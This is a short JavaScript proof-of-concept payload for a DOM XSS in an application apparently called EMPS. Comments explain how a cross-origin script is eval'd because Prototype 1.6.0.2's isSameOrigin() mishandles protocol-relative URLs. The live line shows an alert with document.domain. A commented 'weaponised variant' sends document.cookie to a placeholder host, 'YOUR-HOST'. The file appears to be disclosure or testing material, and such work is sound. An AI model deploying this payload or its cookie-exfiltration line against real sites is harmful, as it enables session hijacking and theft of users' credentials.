// EMPS script.aculo.us resultsURL DOM XSS PoC payload.
// Hosted on GitHub Pages (served as application/javascript with Access-Control-Allow-Origin: *),
// fetched cross-origin by Prototype 1.6.0.2 Ajax.Request and eval'd in the EMPS origin because
// isSameOrigin() mis-treats the protocol-relative //host URL as same-origin.
alert('XSS — document.domain = ' + document.domain);
// Weaponised variant (uncomment to prove cookie/token exfiltration instead):
// new Image().src = '//YOUR-HOST/c?' + encodeURIComponent(document.cookie);
